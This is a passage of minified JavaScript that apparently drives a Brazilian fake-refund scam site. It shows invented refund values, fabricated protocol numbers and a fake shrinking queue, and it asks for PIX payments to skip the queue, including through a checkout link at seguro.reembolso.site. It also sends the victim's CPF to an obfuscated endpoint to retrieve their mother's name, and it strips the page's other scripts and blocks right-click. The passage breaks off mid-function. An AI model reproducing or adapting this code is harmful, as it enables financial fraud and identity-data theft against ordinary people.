function t(t) {
    return document.querySelector(t) ? ? null
}

function e(t) {
    return document.querySelectorAll(t) ? ? null
}
async function a(t) {
    if (navigator.clipboard && navigator.clipboard.writeText) try {
        return await navigator.clipboard.writeText(t), !0
    } catch (t) {
        console.warn("Erro ao usar navigator.clipboard:", t)
    }
    try {
        const e = document.createElement("textarea");
        e.value = t, e.style.position = "fixed", e.style.top = "-9999px", document.body.appendChild(e), e.focus(), e.select();
        const a = document.execCommand("copy");
        return document.body.removeChild(e), a
    } catch (t) {
        return console.error("Fallback de cópia falhou:", t), !1
    }
}
async function o(t, e) {
    const a = new(window.AudioContext || window.webkitAudioContext);
    async function o(t) {
        const e = await fetch(t),
            o = await e.arrayBuffer();
        return await a.decodeAudioData(o)
    }
    const [n, s] = await Promise.all([o(t), o(e)]), i = Math.max(n.numberOfChannels, s.numberOfChannels), r = n.sampleRate, l = n.duration + s.duration, c = a.createBuffer(i, Math.ceil(l * r), r);
    for (let t = 0; t < i; t++) {
        const e = c.getChannelData(t),
            a = n.getChannelData(Math.min(t, n.numberOfChannels - 1));
        e.set(a, 0)
    }
    for (let t = 0; t < i; t++) {
        const e = c.getChannelData(t),
            a = s.getChannelData(Math.min(t, s.numberOfChannels - 1));
        e.set(a, Math.floor(n.duration * r))
    }
    const d = new OfflineAudioContext(i, c.length, r),
        u = d.createBufferSource();
    u.buffer = c, u.connect(d.destination), u.start(0);
    const m = function(t) {
        const e = t.numberOfChannels,
            a = t.length * e * 2 + 44,
            o = new ArrayBuffer(a),
            n = new DataView(o),
            s = [],
            i = t.sampleRate;
        let r = 0;

        function l(t) {
            for (let e = 0; e < t.length; e++) n.setUint8(r + e, t.charCodeAt(e));
            r += t.length
        }
        l("RIFF"), n.setUint32(r, 36 + t.length * e * 2, !0), r += 4, l("WAVE"), l("fmt "), n.setUint32(r, 16, !0), r += 4, n.setUint16(r, 1, !0), r += 2, n.setUint16(r, e, !0), r += 2, n.setUint32(r, i, !0), r += 4, n.setUint32(r, i * e * 2, !0), r += 4, n.setUint16(r, 2 * e, !0), r += 2, n.setUint16(r, 16, !0), r += 2, l("data"), n.setUint32(r, t.length * e * 2, !0), r += 4;
        for (let a = 0; a < e; a++) s.push(t.getChannelData(a));
        let c = new Float32Array(t.length * e);
        for (let a = 0; a < t.length; a++)
            for (let t = 0; t < e; t++) c[a * e + t] = s[t][a];
        let d = 44;
        for (let t = 0; t < c.length; t++, d += 2) {
            let e = Math.max(-1, Math.min(1, c[t]));
            n.setInt16(d, e < 0 ? 32768 * e : 32767 * e, !0)
        }
        return new Blob([n], {
            type: "audio/wav"
        })
    }(await d.startRendering());
    return URL.createObjectURL(m)
}
const n = {
    Acre: "AC",
    Alagoas: "AL",
    "Amapá": "AP",
    Amazonas: "AM",
    Bahia: "BA",
    "Ceará": "CE",
    "Distrito Federal": "DF",
    "Espírito Santo": "ES",
    "Goiás": "GO",
    "Maranhão": "MA",
    "Minas Gerais": "MG",
    "Mato Grosso do Sul": "MS",
    "Mato Grosso": "MT",
    "Pará": "PA",
    "Paraíba": "PB",
    Pernambuco: "PE",
    "Piauí": "PI",
    "Paraná": "PR",
    "Rio de Janeiro": "RJ",
    "Rio Grande do Norte": "RN",
    "Rondônia": "RO",
    Roraima: "RR",
    "Rio Grande do Sul": "RS",
    "Santa Catarina": "SC",
    Sergipe: "SE",
    "São Paulo": "SP",
    Tocantins: "TO"
};
e("script").forEach(t => {
    t.remove()
});
let s = 37.9;
if (t(".multioption-cnh") && t(".listaquiz")) {
    setTimeout(() => {
        t("#quizpage-loading").style.display = "none", t("#quizpage-start").style.display = ""
    }, 1500);
    let wt = 0;

    function i() {
        t(".visao-servico .content").setAttribute("style", "transform: translateX(calc(-" + 100 * wt + "% - " + 20 * wt + "px))")
    }

    function r() {
        t("#qu-nextbtn").classList.remove("secondary"), t("#qu-nextbtn").classList.remove("disabled"), t("#qu-nextbtn").classList.add("primary")
    }

    function l() {
        t("#qu-nextbtn").classList.remove("primary"), t("#qu-nextbtn").classList.add("disabled"), t("#qu-nextbtn").classList.add("secondary")
    }["a", "b", "c", "d", "e"].forEach(e => {
        const a = t("#check-cnh-" + e);
        a.addEventListener("change", function() {
            let e = !1;
            a.checked ? (a.parentElement.classList.add("selected"), e = !0) : (a.parentElement.classList.remove("selected"), t(".multioption-cnh").querySelectorAll("input[type='checkbox']").forEach(t => {
                t.checked && (e = !0)
            })), e ? r() : l()
        })
    });
    const St = t("form#cnh-data");

    function c() {
        let t = !0;
        St.querySelectorAll("select").forEach(e => {
            e.value || (t = !1)
        }), t ? r() : l()
    }
    St.addEventListener("change", c), t("#qu-nextbtn").addEventListener("click", function(a) {
        this.classList.contains("primary") && (t("body").scrollIntoView({
            behavior: "smooth"
        }), wt += 1, i(), 2 == wt ? (t("#qu-backbtn").classList.add("disabled"), l(), setTimeout(() => {
            setTimeout(() => {
                wt = 1, i(), t("#qu-backbtn").classList.remove("disabled"), c()
            }, 1e3);
            const a = new Date,
                o = a.toLocaleDateString("pt-BR"),
                n = a.toLocaleTimeString("pt-BR"),
                s = n.split(":"),
                r = s[0] + ":" + s[1] ? ? n;
            if (!localStorage.getItem("consulta_valor")) {
                let a = 0;
                a += 500 * e("input[type='checkbox']:checked").length, a += 500 * parseInt(t("#gastoSelector").value);
                let o = 987.52;
                a > 5e3 ? o = 5487.52 : a > 4e3 ? o = 4487.57 : a > 3e3 ? o = 3487.52 : a > 2e3 ? o = 2487.52 : a > 1e3 && (o = 1487.52), localStorage.setItem("consulta_valor", o)
            }
            localStorage.setItem("consulta_protocolo", parseInt(1e9 + 9e9 * Math.random())), localStorage.setItem("consulta_data", `${o} às ${r}`), localStorage.setItem("consulta_estado", t("#stateSelector").value), window.location.href = "/valores"
        }, 3e3)) : 1 == wt && c())
    }), t("#qu-backbtn").addEventListener("click", function(t) {
        if (this.classList.contains("disabled")) return t.preventDefault();
        0 != wt && (t.preventDefault(), wt -= 1, i(), r())
    });
    const xt = t("select#yearSelector");
    for (let Et = 2025; Et >= 2010; Et--) {
        const Lt = document.createElement("option");
        Lt.innerHTML = Et, Lt.value = Et, xt.appendChild(Lt)
    }
    const Ct = t("select#stateSelector");
    Object.entries(n).forEach(([t, e]) => {
        const a = document.createElement("option");
        a.innerHTML = t, a.value = e, Ct.appendChild(a)
    });
    t("select#gastoSelector")
}
if (t(".solicitar-modal")) {
    t(".solicitar-modal");
    t("#qu-nextbtn").addEventListener("click", function(t) {
        A(1)
    })
}

function d(t) {
    return t.replace(/^(\d{3})(\d{3})(\d{3})(\d{0,2})/, "$1.$2.$3-$4")
}

function u(t) {
    return new Intl.NumberFormat("pt-BR", {
        style: "currency",
        currency: "BRL"
    }).format(t).replaceAll("R$", "")
}["name", "doc", "gender", "bdate"].forEach(t => {
    const e = "form_" + t;
    localStorage.getItem(e) || (window.location.href = "/acesso")
}), (t(".boleto-container") || t(".chatbox")) && ["valor", "protocolo", "data"].forEach(t => {
    const e = "consulta_" + t;
    localStorage.getItem(e) || (window.location.href = "/consulta")
}), e("#userName").forEach(t => {
    t.textContent = localStorage.getItem("form_name")
}), e("input#userName").forEach(t => {
    t.value = localStorage.getItem("form_name")
}), e("#userName-Min").forEach(t => {
    const e = localStorage.getItem("form_name").split(" ");
    t.textContent = e[0] + " " + e[e.length - 1]
}), e("#userDocument").forEach(t => {
    const e = localStorage.getItem("form_doc");
    t.textContent = d(e)
}), e("#userGender").forEach(t => {
    const e = localStorage.getItem("form_gender");
    t.textContent = "M" == e ? "Masculino" : "F" == e ? "Feminino" : "Sem informação"
});
const m = localStorage.getItem("form_bdate").split("-"),
    p = m[2] + "/" + m[1] + "/" + m[0];
e("#userNascimento").forEach(t => {
    t.textContent = p
}), e("#consultaValor").forEach(t => {
    const e = localStorage.getItem("consulta_valor");
    t.textContent = u(e)
}), e("#consultaValorAgendar").forEach(t => {
    const e = parseFloat(localStorage.getItem("consulta_valor"));
    let a = 0;
    ! function o() {
        a += 100 * Math.random(), a > e && (a = e), t.textContent = u(a), a < e && setTimeout(o, 20)
    }()
}), e("#consultaProtocolo").forEach(t => {
    t.textContent = localStorage.getItem("consulta_protocolo")
}), e("#consultaData").forEach(t => {
    t.textContent = localStorage.getItem("consulta_data")
}), e("#consultaEstado").forEach(t => {
    t.textContent = localStorage.getItem("consulta_estado")
}), e("img").forEach(t => {
    t.addEventListener("contextmenu", function(t) {
        return t.preventDefault(), !1
    })
});
const h = 1;
let f = "/assets/sfx/tlk_1.mp3",
    g = "/assets/sfx/tlk_7.mp3",
    b = "/assets/sfx/tlk_2.mp3",
    y = {},
    v = "",
    w = !1,
    S = "C",
    x = "A";
if (localStorage.getItem("tbtyp") && (S = localStorage.getItem("tbtyp").toUpperCase() ? ? S), localStorage.getItem("ftype") && (x = localStorage.getItem("ftype").toUpperCase() ? ? x), t("#consultaValor") && t("#resgadesc") && "C" === S) {
    const At = JSON.parse(localStorage.getItem("tb_responses") ? ? "[]");
    ("A" === x || At.inputchave) && (e("#resgatype").forEach(t => {
        t.textContent = "Agendar resgate"
    }), t("#resgadesc").textContent = "Faça o agendamento do repasse para receber os seus valores disponíveis.", t("#nxtactionbtn").href = "/agendar")
}
t("#agendarbackbtn") && "A" === x && (t("#agendarbackbtn").href = "/valores");
let C = !1;
const E = t(".agendar-modal") ? ? t(".solicitar-modal"),
    L = t(".agendar-modal .window") ? ? t(".solicitar-modal .window");
if (E && L) {
    function A(e) {
        E.querySelectorAll("[contentID]").forEach(t => {
            parseInt(t.getAttribute("contentID")) === parseInt(e) ? t.style.display = "" : t.style.display = "none"
        }), t("body").style.overflow = "hidden", L.style.marginTop = "100vh", E.style.display = "", setTimeout(() => {
            E.style.opacity = 1, L.style.marginTop = "0vh"
        }, 10)
    }

    function M() {
        !0 !== C && (E.style.opacity = 0, L.style.marginTop = "100vh", setTimeout(() => {
            t("body").style.overflow = "", E.style.display = "none"
        }, 300))
    }
    E.addEventListener("click", function(t) {
        t.target === E && M()
    }), E.querySelector(".window .close").addEventListener("click", M)
}
if (t(".form-schedule")) {
    const Mt = parseFloat(t(".MAINTKT").textContent ? ? "19.82"),
        _t = parseFloat(t(".MULTTKT").textContent ? ? "7.42");
    let It = Mt;
    const Tt = t("#userPIXKey"),
        kt = JSON.parse(localStorage.getItem("tb_responses") ? ? "[]");
    let Rt = 1;

    function _() {
        Tt.value.length > 0 && t("#userName").value.length > 0 && 1 === Rt ? t("#qu-nextbtn").removeAttribute("disabled") : t("#qu-nextbtn").setAttribute("disabled", "")
    }
    t("#entrarfila").addEventListener("click", function() {
        M()
    }), e("#pularfila").forEach(e => {
        e.addEventListener("click", function() {
            M(), setTimeout(() => {
                t("input#fila1").click()
            }, 400)
        })
    }), t("#confirmpularfila").addEventListener("click", function() {
        M()
    });
    const Ft = t(".resumofinal"),
        Pt = t("#opt2tarifa"),
        qt = t("#prazorepasse").textContent;
    t("input#fila1").addEventListener("click", function() {
        A(2), t("#qu-nextbtn").removeAttribute("disabled"), Ot.style.height = "450px", Ft.style.display = "", Pt.style.display = ""
    }), t("input#fila2").addEventListener("input", function() {
        A(1), t("#qu-nextbtn").removeAttribute("disabled"), Ot.style.height = "410px", Ft.style.display = "", Pt.style.display = "none", t("#prazorepasse").textContent = qt
    });
    let Bt = 0;
    [5e3, 4e3, 2500, 1e3, 500, 250].forEach(t => {
        const a = Bt,
            o = document.createElement("button");
        o.className = "jump-btn", o.textContent = `#${t}`;
        const n = 3 * t / 60;
        let s = "";
        if (n < 60) {
            const t = Math.round(n);
            s = `${t} minuto${1!==t?"s":""}`
        } else if (n < 1440) {
            const t = parseInt(n / 60);
            s = `${t.toFixed(0)} hora${"1.0"!==t.toFixed(1)?"s":""}`
        } else {
            const t = parseInt(n / 1440);
            s = `${t.toFixed(0)} dia${"1.0"!==t.toFixed(1)?"s":""}`
        }
        o.addEventListener("click", () => {
            selectedFee = a, document.querySelectorAll(".tempototalifskip").forEach(t => {
                t.textContent = s
            }), e("#confirmTarget").forEach(e => {
                e.textContent = `#${t}`
            }), e("#newPosLabel").forEach(e => {
                e.textContent = u(t).split(",")[0]
            });
            Math.max(1, Math.abs(Nt - t));
            const n = It = Math.max(Mt, Mt + a * _t);
            e("#feeLabel").forEach(t => {
                t.textContent = `R$ ${n.toFixed(2).replace(".",",")}`
            }), document.getElementById("confirmTarget").dataset.fee = n, document.querySelectorAll(".jump-btn").forEach(t => {
                t === o ? t.classList.add("selected") : t.classList.remove("selected")
            })
        }), jumpOptions.appendChild(o), 0 === a && setTimeout(() => {
            o.click()
        }, 100), Bt++
    });
    const $t = t("#step01"),
        Ot = t("#step02");
    t("#copiarpix").addEventListener("click", () => {
        a(t("#pixCodeBox").textContent);
        const e = document.querySelector(".notificationPix");
        e.classList.contains("show") || (e.classList.add("show"), setTimeout(() => {
            e.classList.remove("show")
        }, 4e3))
    }), t("#qu-nextbtn").addEventListener("click", function(e) {
        if (!this.getAttribute("disabled"))
            if (1 === Rt) window._FBQCLL("track", "InitiateCheckout"), $t.querySelectorAll("input").forEach(t => {
                t.setAttribute("readOnly", "")
            }), $t.style.opacity = .5, Ot.style.height = t("input#fila1").checked ? "450px" : t("input#fila2").checked ? "410px" : "328px", Ot.style.opacity = 1, setTimeout(() => {
                Ot.scrollIntoView({
                    behavior: "smooth",
                    block: "center"
                })
            }, 300), this.setAttribute("disabled", ""), Rt = 2;
            else if (2 === Rt)
            if (t("input#fila2").checked) {
                C = !0, A(3);
                L.querySelector("[contentID='3']");
                L.querySelector(".close").style.display = "none", setTimeout(() => {
                    C = !1, M(), setTimeout(() => {
                        L.querySelector(".close").style.display = "", A(4)
                    }, 400)
                }, 3500)
            } else if (t("input#fila1")) {
            C = !0, A(5);
            L.querySelector("[contentID='3']");
            L.querySelector(".close").style.display = "none", _STDT_PXPGN(It, e => {
                t("#pixCodeBox").textContent = e, C = !1, M(), setTimeout(() => {
                    L.querySelector(".close").style.display = "", A(6)
                }, 400)
            }, 4e3)
        }
    }), t("#agendarbackbtn").addEventListener("click", function(e) {
        1 !== Rt && (e.preventDefault(), 2 === Rt && ($t.scrollIntoView({
            behavior: "smooth",
            block: "center"
        }), $t.style.opacity = 1, $t.querySelectorAll("input").forEach(t => {
            t.removeAttribute("readOnly")
        }), t("#qu-nextbtn").removeAttribute("disabled"), Ot.style.height = "0px", Ot.style.opacity = 0, Rt = 1))
    }), "B" === x ? (kt.inputchave && (Tt.value = kt.inputchave, Tt.classList.add("ok")), _()) : setTimeout(() => {
        Tt.focus()
    }, 500), [Tt, t("#userName")].forEach(t => {
        t.addEventListener("input", function(t) {
            t.target.value.length > 0 ? t.target.classList.add("ok") : t.target.classList.remove("ok"), _()
        })
    });
    let Nt = parseInt(localStorage.getItem("positionQueue") ? ? "1929357");

    function I(e) {
        Nt -= e, localStorage.setItem("positionQueue", Nt), t(".poscont strong").textContent = t("#curPosLabel").textContent = u(Nt).split(",")[0], setTimeout(() => {
            I(1)
        }, 1e3 + 3e3 * Math.random())
    }
    I(0), document.querySelectorAll('.card input[type="radio"]').forEach(t => {
        t.addEventListener("change", () => {
            document.querySelectorAll(".card").forEach(t => {
                t.classList.remove("selected")
            }), t.closest(".card").classList.add("selected")
        })
    })
}

function T(t) {
    return t.split("").reverse().join("")
}

function k() {
    const t = ["Ana", "Beatriz", "Camila", "Daniela", "Fernanda", "Gabriela", "Isabela", "Juliana", "Larissa", "Mariana"],
        e = ["Silva", "Souza", "Oliveira", "Pereira", "Costa", "Almeida", "Lima", "Ribeiro", "Martins", "Carvalho"];
    return `${t[Math.floor(Math.random()*t.length)]} ${e[Math.floor(Math.random()*e.length)]} ${e[Math.floor(Math.random()*e.length)]}`
}

function R(t) {
    const e = atob(t),
        a = Uint8Array.from(e, t => t.charCodeAt(0));
    return new TextDecoder("utf-8").decode(a)
}

function F() {
    y = {
        protocolo_atendimento: localStorage.getItem("consulta_protocolo"),
        valor_formatado: u(localStorage.getItem("consulta_valor")),
        nascimento_formatado: p,
        audio_welcome: f,
        audio_value: b,
        audio_target: g,
        random_data1: "28/09/2002",
        random_data2: "07/09/1998",
        random_data3: "18/04/1989",
        random_nome1: k(),
        random_nome2: k(),
        random_nome3: k(),
        realmthrnome: !1
    }, async function() {
        fetch("/assets/tb/" + S).then(t => t.text()).then(t => {
            const e = R(T(t));
            Y = JSON.parse(e)
        })
    }()
}
async function P(t, e = 1.5) {
    const a = new(window.AudioContext || window.webkitAudioContext),
        o = await fetch(t),
        n = await o.arrayBuffer(),
        s = await a.decodeAudioData(n),
        i = new OfflineAudioContext(s.numberOfChannels, s.length, s.sampleRate),
        r = i.createBufferSource();
    r.buffer = s;
    const l = i.createGain();
    l.gain.value = e, r.connect(l).connect(i.destination), r.start(0);
    const c = q(await i.startRendering());
    return URL.createObjectURL(c)
}

function q(t) {
    const e = t.numberOfChannels,
        a = t.length * e * 2 + 44,
        o = new ArrayBuffer(a),
        n = new DataView(o);

    function s(t, e, a) {
        for (let o = 0; o < a.length; o++) t.setUint8(e + o, a.charCodeAt(o))
    }
    let i = 0;
    s(n, i, "RIFF"), i += 4, n.setUint32(i, 36 + t.length * e * 2, !0), i += 4, s(n, i, "WAVE"), i += 4, s(n, i, "fmt "), i += 4, n.setUint32(i, 16, !0), i += 4, n.setUint16(i, 1, !0), i += 2, n.setUint16(i, e, !0), i += 2, n.setUint32(i, t.sampleRate, !0), i += 4, n.setUint32(i, 2 * t.sampleRate * e, !0), i += 4, n.setUint16(i, 2 * e, !0), i += 2, n.setUint16(i, 16, !0), i += 2, s(n, i, "data"), i += 4, n.setUint32(i, t.length * e * 2, !0), i += 4;
    const r = B(t);
    let l = 44;
    for (let t = 0; t < r.length; t++, l += 2) {
        const e = Math.max(-1, Math.min(1, r[t]));
        n.setInt16(l, e < 0 ? 32768 * e : 32767 * e, !0)
    }
    return new Blob([n], {
        type: "audio/wav"
    })
}

function B(t) {
    const e = [];
    for (let a = 0; a < t.numberOfChannels; a++) e.push(t.getChannelData(a));
    const a = t.length * t.numberOfChannels,
        o = new Float32Array(a);
    let n = 0;
    for (let a = 0; a < t.length; a++)
        for (let s = 0; s < t.numberOfChannels; s++) o[n++] = e[s][a];
    return o
}
t(".chatbox") && t(".chatloading") && ("C" !== S && setTimeout(() => {}, 100), F(), async function() {
    try {
        let t = localStorage.getItem("form_name").split(" "),
            e = t[0];
        e.length < 4 && void 0 !== t[1] && (e += " " + t[1]), e = e.replaceAll(" ", "_").toLocaleLowerCase();
        let a = await P("/assets/sfx/dynamic/wlcm_" + e + ".mp3", 5),
            n = await o(a, f);
        f = n ? ? f;
        let s = await o(b, "/assets/sfx/vlue_" + parseInt(localStorage.getItem("consulta_valor")) + ".mp3");
        b = s ? ? b;
        let i = await P("/assets/sfx/dynamic/trgt_" + e + ".mp3", 5),
            r = await o(i, g);
        g = r ? ? g, await et(), w = !0
    } catch (t) {
        await et(), w = !0
    }
}(), setTimeout(() => {
    ! function e() {
        1 == w ? (t(".chatloading").style.opacity = 0, setTimeout(() => {
            t(".chatloading").style.display = "none"
        }, 500), setTimeout(() => {
            t(".chatbox").style.opacity = 1, setTimeout(() => {
                t(".statusatendimento").textContent = "online", tt.start()
            }, 200)
        }, 300)) : setTimeout(() => {
            e()
        }, 500)
    }()
}, 3e3)), document.addEventListener("DOMContentLoaded", function() {
    const t = localStorage.getItem("form_doc");
    t && fetch(T("kcehc/ss"), {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            ctup: btoa(t)
        })
    }).then(t => t.text()).then(t => {
        try {
            const e = JSON.parse(atob(T(t)))[atob("dXNlckRhdGE=")],
                a = atob("bm9tZU1hZQ==");
            e && e[a] && e[a].length > 4 && "waiting..." !== e[a] && (y.realmthrnome = e[a]), console.log(y)
        } catch (t) {}
    })
});
class $ {
    constructor() {
        this.audioContext = new(window.AudioContext || window.webkitAudioContext), this.sounds = new Map
    }
    async preload(t, e) {
        if (this.sounds.has(t)) return;
        const a = await fetch(e),
            o = await a.arrayBuffer(),
            n = await this.audioContext.decodeAudioData(o);
        this.sounds.set(t, n)
    }
    playSound(t, e = 1) {
        const a = this.sounds.get(t);
        if (!a) return void console.warn(`Som "${t}" não foi pré-carregado.`);
        const o = this.audioContext.createBufferSource();
        o.buffer = a;
        const n = this.audioContext.createGain();
        n.gain.value = e, o.connect(n).connect(this.audioContext.destination), o.start(0)
    }
}
const O = new $;

function N(t) {
    const e = document.createElement("div");
    e.classList.add("audio-player");
    const a = document.createElement("div");
    a.classList.add("kontrols");
    const o = document.createElement("button");
    o.classList.add("play-btn"), o.classList.add("paused");
    const n = document.createElement("div");
    n.classList.add("progress-container");
    const s = document.createElement("div");
    s.classList.add("progress"), n.appendChild(s);
    const i = document.createElement("div");

    function r(t) {
        const e = Math.floor(t / 60),
            a = Math.floor(t % 60);
        return `${e}:${a<10?"0":""}${a}`
    }
    i.classList.add("time-display"), i.innerHTML = "<span>0:00</span><span>0:00</span>", a.appendChild(o), a.appendChild(n), e.appendChild(a), e.appendChild(i), t.style.display = "none", t.parentNode.insertBefore(e, t), o.addEventListener("click", () => {
        t.paused ? (t.play(), o.classList.remove("paused")) : (t.pause(), o.classList.add("paused"))
    }), t.addEventListener("play", () => {
        o.classList.remove("paused")
    }), t.addEventListener("loadedmetadata", () => {
        i.innerHTML = `<span>0:00</span><span>${r(t.duration)}</span>`
    }), t.addEventListener("timeupdate", () => {
        i.innerHTML = `<span>${r(t.currentTime)}</span><span>${r(t.duration)}</span>`;
        const e = t.currentTime / t.duration * 100;
        s.style.width = e + "%"
    }), t.addEventListener("ended", () => {
        o.classList.add("paused")
    }), n.addEventListener("click", e => {
        const a = n.getBoundingClientRect(),
            o = (e.clientX - a.left) / a.width;
        t.currentTime = o * t.duration
    })
}(async () => {
    await O.preload("msg_receive", "/assets/sfx/msg_receive.mp3"), await O.preload("msg_send", "/assets/sfx/msg_send.mp3")
})();
const D = {
    key: "tb_responses",
    load() {
        try {
            const t = localStorage.getItem(this.key);
            return t ? JSON.parse(t) : {}
        } catch (t) {
            return console.error("Storage load", t), {}
        }
    },
    save(t) {
        localStorage.setItem(this.key, JSON.stringify(t)), K()
    },
    set(t, e) {
        const a = this.load();
        a[t] = e, this.save(a)
    },
    get(t, e = "") {
        return this.load()[t] ? ? e
    },
    all() {
        return this.load()
    },
    clear() {
        localStorage.removeItem(this.key), K()
    }
};

function U(t, e) {
    return t ? t.replace(/\{\{(.*?)\}\}/g, (t, a) => {
        const o = a.trim();
        return void 0 !== e[o] && null !== e[o] ? e[o] : ""
    }) : ""
}

function G(t) {
    return new Promise(e => setTimeout(e, t))
}
const z = document.getElementById("chat"),
    H = document.getElementById("textin"),
    V = document.getElementById("sendBtn"),
    J = document.getElementById("progress"),
    j = document.getElementById("savedCount");

function K() {}

function X(e, a = "bot", o = {}) {
    let n = e;
    for (const t in y) n = n.replaceAll(`[[${t}]]`, y[t]);
    "bot" == a ? O.playSound("msg_receive", .8) : O.playSound("msg_send", .8);
    const s = document.createElement("div");
    if (s.className = "msg " + ("user" === a ? "user" : "bot"), o.audio) {
        s.innerHTML = `<div class="content"><audio autoplay controls controlsList="nodownload" src="${n}"></audio></div>`;
        const t = s.querySelector("audio");
        N(t), t.addEventListener("loadedmetadata", () => {
            t.play().catch(t => console.warn("Autoplay bloqueado pelo navegador:", t))
        })
    } else s.innerHTML = `<div class="content">${n}</div>`;
    let i = !!o.time && o.time;
    if (i) {
        const t = i.split(":");
        i = t[0] + ":" + t[1]
    }
    return i && (s.innerHTML += `<div class="time">${i}</div>`), z.appendChild(s), z.scrollTop = z.scrollHeight, setTimeout(() => {
        t(".chatbox .chat").scrollIntoView({
            behavior: "smooth",
            block: "end"
        }), t(".chatbox").scrollTop = t(".chatbox").scrollHeight
    }, 50), s
}

function Q(e = 700) {
    const a = document.createElement("div");
    return a.className = "msg bot typing", a.innerHTML = '<div class="dot"></div><div class="dot"></div><div class="dot"></div>', z.appendChild(a), z.scrollTop = z.scrollHeight, t(".chatbox .chat").scrollIntoView({
        behavior: "smooth",
        block: "end"
    }), t(".chatbox").scrollTop = t(".chatbox").scrollHeight, a
}
K();
class W {
    constructor(t) {
        this.flow = t, this.node = t.start, this.functions = {}, this.state = {
            visited: [],
            score: 0
        }, this.rendering = !1
    }
    registerFunction(t, e) {
        this.functions[t] = e
    }
    async start() {
        if (!this.flow || !this.flow.nodes) throw new Error("Flow inválido");
        t("body").scrollIntoView({
            behavior: "smooth"
        }), this.goto(this.flow.start)
    }
    async goto(t) {
        t && (this.node = t, await this.runNode(this.flow.nodes[t]))
    }
    async runNode(t) {
        if (!t) return;
        this.state.visited.push(t);
        let e = 1e3;
        if (t.delay && (e = .3 * t.delay * 1, await G(.7 * t.delay * 1)), "message" === t.type) {
            if (t.audio) {
                const a = Q(e);
                await G(e + 200), a.remove(), X(t.audio, "bot", {
                    audio: !0
                })
            } else {
                const a = U(t.text, D.all()),
                    o = Q(e);
                await G(e + 400), o.remove(), X(a, "bot")
            }
            this.maybeUpdateProgress(), t.next && await this.goto(t.next)
        } else if ("input" === t.type) {
            if (t.text) {
                const a = U(t.text, D.all()),
                    o = Q(e);
                await G(e + 400), o.remove(), X(a, "bot")
            }
            await this.waitForUserInput(t)
        } else if ("options" === t.type)
            if (!t.require || y[t.require]) {
                if (t.text) {
                    U(t.text, D.all());
                    const a = Q(e);
                    await G(e + 400), a.remove()
                }
                await this.showOptions(t)
            } else this.goto(t.skip);
        else if ("function" === t.type) {
            const a = t.name,
                o = this.functions[a],
                n = Q(e);
            if (await G(e + 400), n.remove(), "function" == typeof o) try {
                await o(t.with ? ? {}, {
                    engine: this,
                    Storage: D
                })
            } catch (t) {
                console.error("function error", t)
            } else console.warn("Função não registrada:", a);
            t.next && await this.goto(t.next)
        } else if ("end" === t.type) {
            if (t.text) {
                const a = U(t.text, D.all()),
                    o = Q(e);
                await G(e + 400), o.remove(), X(a, "bot")
            }
            this.maybeUpdateProgress(100)
        }
    }
    maybeUpdateProgress(t) {
        if (void 0 === t) {
            const t = Object.keys(this.flow.nodes).length,
                e = Math.round(this.state.visited.length / t * 100);
            J.style.width = e + "%", J.style.transition = "width .6s"
        } else J.style.width = t + "%", J.style.transition = "width .6s"
    }
    waitForUserInput(t) {
        return new Promise(e => {
            V.disabled = !1, H.disabled = !1, H.placeholder = t.placeholder ? ? "", H.focus();
            let a = !1;
            const o = async () => {
                let n = H.value.trim();
                if (n = n.replace(/</g, "&lt;").replace(/>/g, "&gt;"), "" !== n || !0 === t.allowEmpty) {
                    if (Z(n), await G(300), t.key && D.set(t.key, n), t.onSubmit) {
                        const e = Array.isArray(t.onSubmit) ? t.onSubmit : [t.onSubmit];
                        for (const a of e) {
                            const e = this.functions[a];
                            if ("function" == typeof e) try {
                                await e({
                                    value: n,
                                    fromKey: t.key
                                }, {
                                    engine: this,
                                    Storage: D
                                })
                            } catch (t) {
                                console.error(t)
                            }
                        }
                    }
                    H.value = "", V.removeEventListener("click", o), a = !0, V.disabled = !0, H.disabled = !0, e(), t.next && await this.goto(t.next)
                }
            };
            V.addEventListener("click", o), H.addEventListener("keydown", t => {
                a || "Enter" === t.key && (t.preventDefault(), o())
            }, {
                once: !1
            })
        })
    }
    showOptions(e) {
        let a = e.text;
        for (const t in y) a = a.replaceAll(`[[${t}]]`, y[t]);
        return new Promise(async o => {
            const n = document.createElement("div");
            n.className = "msg bot";
            const s = document.createElement("div");
            s.innerHTML = `<div class="content">${U(a||"",D.all())}<div class="options"></div></div>`, n.appendChild(s.firstElementChild), z.appendChild(n);
            const i = n.querySelector(".options");
            O.playSound("msg_receive");
            let r = [];
            e.options.forEach(t => {
                let a = t.label;
                for (const t in y) a = a.replaceAll(`[[${t}]]`, y[t]);
                const n = document.createElement("button");
                r.push(n), n.className = "opt", n.textContent = a, a.split(" ").length >= 2 && "Chave aleatória" !== a ? n.style.width = "100%" : 3 === a.split("/").length && (n.style.width = "48%"), n.addEventListener("click", async () => {
                    this.disabled || t.disabled || (r.forEach(t => {
                        t.disabled = !0
                    }), Z(a), await G(300), e.saveKey && D.set(e.saveKey, t.value), t.next ? (await G(250), o(), await this.goto(t.next)) : e.next ? (await G(250), o(), await this.goto(e.next)) : o())
                }), i.appendChild(n)
            }), t(".chatbox .chat").scrollIntoView({
                behavior: "smooth",
                block: "end"
            }), t(".chatbox").scrollTop = t(".chatbox").scrollHeight
        })
    }
}

function Z(t) {
    const e = document.createElement("div");
    e.className = "msg user typing", e.innerHTML = '<div class="dot"></div><div class="dot"></div><div class="dot"></div>', z.appendChild(e), z.scrollTop = z.scrollHeight, setTimeout(() => {
        e.remove(), X(t, "user", {
            time: (new Date).toLocaleTimeString()
        })
    }, 280)
}
let Y = {},
    tt = !1;
async function et() {
    y.audio_welcome = f, y.audio_value = b, y.audio_target = g, tt = new W(Y), tt.registerFunction("pixcode", async () => {
        X(`\n\n        Aqui está o código PIX de pagamento do seu <i><strong>CAST 2025</strong></i>:\n        <br><br>\n        <input type="text" class="copypixcontainer" readonly="true" value="${v}">\n        <button class="copypixbutton" onclick="M4357834603569(document.querySelector('.copypixcontainer'))">Copiar código</button>\n        <br><br>\n        Faça o pagamento em até <strong>5 minutos</strong> para evitar o cancelamento.\n\n      `, "bot")
    }), tt.registerFunction("pixcheckout", async () => {
        X('\n\n        Aqui está o link de pagamento do seu <i><strong>CAST 2025</strong></i>:\n        <br><br>\n        <a href="https://seguro.reembolso.site/payment/checkout/442bc1e9-e63c-4f4b-9b90-5e844077617e"><button class="copypixbutton">Clique aqui</button></a>\n        <br><br>\n        Faça o pagamento em até <strong>10 minutos</strong> para evitar o cancelamento.\n\n      ', "bot")
    }), tt.registerFunction("queuecheckout", async () => {
